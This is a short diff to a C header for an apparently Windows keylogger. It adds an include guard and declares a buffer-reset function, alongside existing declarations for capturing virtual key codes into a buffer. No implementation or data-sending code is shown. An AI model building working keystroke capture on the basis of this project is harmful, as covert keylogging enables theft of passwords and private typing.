@@ -3,8 +3,10 @@
 #include "keypair.h"
 #include "../program/utils.h"
 
-
 #ifndef KEYLOGGER_H
+#define KEYLOGGER_H
+
+
 
 #define NUM_KEYS 254  // 254 key
 #define A 0x41  // key code for A
@@ -40,6 +42,8 @@ void keyLoggerCleanup(KEY_LOGGER* kLogger); // cleanup keylogger memory
 BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode);
 // method to add the content of a key press to the keyBuffer 
 ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode);
+
+void resetKLBufferAndKey(KEY_LOGGER* kLogger, char key);
 
 
 #endif // KEYLOGGER_h
